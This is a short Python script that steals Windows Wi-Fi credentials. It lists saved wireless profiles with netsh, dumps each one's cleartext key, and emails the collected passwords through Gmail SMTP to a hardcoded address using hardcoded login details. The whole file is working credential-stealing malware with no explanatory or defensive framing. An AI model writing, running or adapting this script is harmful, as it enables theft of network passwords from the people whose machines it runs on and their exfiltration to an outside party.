#!/usr/bin/env python3
import subprocess
import smtplib
import re

command = "ls"

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

if __name__ == "__main__":
    key_results = ""
    try:
        networks = subprocess.check_output("netsh wlan show profile", shell=True)
    except:
        networks = ""
        key_results = "Running netsh failed!"

    network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
    if(network_names):
        for network in network_names:
            key = subprocess.check_output("netsh wlan show profile {} key=clear".format(
                  network), shell=True)
            key_results += key

    send_email("yahrightbuddy@gmail.com", "goaway,sneakthief", key_results)
